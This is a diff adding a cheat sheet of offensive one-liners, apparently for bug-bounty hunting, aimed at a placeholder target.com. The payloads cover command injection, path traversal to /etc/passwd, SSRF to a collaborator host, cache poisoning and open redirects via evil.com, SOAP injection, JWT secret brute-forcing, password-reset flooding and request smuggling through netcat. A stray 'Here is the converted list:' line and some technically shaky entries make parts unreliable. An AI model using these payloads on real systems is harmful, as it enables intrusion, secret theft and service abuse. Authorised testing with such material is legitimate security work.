@@ -3205,3 +3205,134 @@ echo '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-' | tr -d '\
 ```bash
 curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | grep -E "backup|admin|.sql|.env|.git"
 ```
+Here is the converted list:
+
+**Test for Server-Side Request Forgery (Advanced)**  
+```bash
+curl "https://target.com/api/fetch?url=http://burpcollaborator.net"
+```
+
+**Auto-Scan for CVEs (Nuclei FTW)**  
+```bash
+nuclei -u https://target.com -t cves/
+```
+
+**Detect Prototype Pollution in Query Strings**  
+```bash
+curl "https://target.com/api?__proto__[exploit]=polluted"
+```
+
+**Test for Cache Poisoning**  
+```bash
+curl -H "X-Forwarded-Host: evil.com" https://target.com
+```
+
+**Find Misconfigured S3 Buckets via Subdomains**  
+```bash
+host -t cname files.target.com | grep amazonaws
+```
+
+**Check for HTTP Parameter Pollution (HPP)**  
+```bash
+curl "https://target.com/login?user=admin&user=guest"
+```
+
+**Test for Open S3 Buckets Directly**  
+```bash
+aws s3 ls s3://target-bucket-name --no-sign-request
+```
+
+**Search for Exposed GitHub Tokens in Source**  
+```bash
+curl -s https://target.com/app.js | grep -E 'ghp_[a-zA-Z0-9]{36}'
+```
+
+**Test for Business Logic Bypass (Rate Limit)**  
+```bash
+for i in {1..100}; do curl -X POST https://target.com/api/v1/reset-password; done
+```
+
+**Detect Information Disclosure via Debug Headers**  
+```bash
+curl -I https://target.com | grep -i "debug\|x-powered-by\|server"
+```
+
+**Detect Unsafe Cross-Origin Resource Sharing (CORS)**  
+```bash
+curl -I -H "Origin: https://evil.com" https://target.com
+```
+
+**Auto-Find Secrets in Git Repos (GitLeaks)**  
+```bash
+gitleaks detect --source=https://github.com/target/repo.git
+```
+
+**Detect Open Redirect via Path Injection**  
+```bash
+curl "https://target.com/redirect?next=//evil.com"
+```
+
+**Find Subdomain Takeover with Subfinder + Nuclei**  
+```bash
+subfinder -d target.com | nuclei -t takeover/
+```
+
+**Test for SOAP Injection (If SOAP API Detected)**  
+```bash
+curl -X POST https://target.com/soap -d '<?xml version="1.0"?><soap:Envelope><soap:Body><exploit><![CDATA[1 or 1=1]]></exploit></soap:Body></soap:Envelope>'
+```
+
+**Detect Weak JWT Secrets (Bruteforce)**  
+```bash
+jwt-tool eyJhbGciOiJ... --brute --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+**Exposed ENV Files via .env**  
+```bash
+curl -s https://target.com/.env
+```
+
+**Check for Cloud Metadata Exposure (AWS/GCP/Azure)**  
+```bash
+curl -H "Host: 169.254.169.254" https://target.com
+```
+
+**Detect Command Injection via Parameter Fuzzing**  
+```bash
+curl 'https://target.com/ping?ip=127.0.0.1;id'
+```
+
+**Test for Fast Redirect Bypass (Open Redirect)**  
+```bash
+curl "https://target.com/redirect?url=//evil.com"
+```
+
+**Detect Path Traversal in Parameters**  
+```bash
+curl "https://target.com/api/v1/files?path=../../../../etc/passwd"
+```
+
+**Look for Exposed Kubernetes Dashboard**  
+```bash
+curl -I https://target.com/k8s/
+```
+
+**Find Rate Limit Issues in Password Reset API**  
+```bash
+seq 1 100 | xargs -I % -P 20 curl -X POST https://target.com/api/v1/reset
+```
+
+**Test HTTP Smuggling with CRLF Injection**  
+```bash
+printf "GET / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG\r\n\r\n" | nc target.com 80
+```
+
+**Detect Client-Side Storage Leaks (localStorage/sessionStorage)**  
+```bash
+curl -s https://target.com/app.js | grep -i "localStorage\|sessionStorage"
+```
+
+**Check for Blind SSRF via PDF Generation**  
+```bash
+curl -X POST https://target.com/api/generate-pdf -d '{"url":"http://your-collaborator.burpcollaborator.net"}'
+```
